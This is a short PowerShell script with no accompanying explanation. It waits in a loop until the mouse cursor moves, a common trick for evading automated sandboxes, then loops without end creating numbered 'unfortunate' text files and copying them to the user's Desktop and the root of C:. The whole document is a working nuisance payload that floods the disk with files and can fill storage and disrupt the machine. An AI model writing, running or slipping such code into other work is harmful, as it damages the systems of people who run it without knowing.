# Import the System.Windows.Forms assembly
Add-Type -AssemblyName System.Windows.Forms

# Store the original position of the cursor
$originalPOS = [System.Windows.Forms.Cursor]::Position

# Loop until the cursor position changes
while (1) {
    # Check if the cursor position has changed
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        # If the cursor has moved, exit the loop
        break
    }
}

# At this point, the script will continue executing

$i = 0

while ($true) {
  $fileC = "unfortunateC$i.txt"
  $fileDesktop = "unfortunateDesktop$i.txt"
  $text = "This is an unfortunate text file $i."

  # Create the text file on the Desktop
  Set-Content $fileDesktop -Value $text
  $destination = "$env:USERPROFILE\Desktop\$fileDesktop"
  Copy-Item $fileDesktop $destination

  # Create the text file on the C drive
  Set-Content $fileC -Value $text
  $destination = "C:\$fileC"
  Copy-Item $fileC $destination

  $i++
}
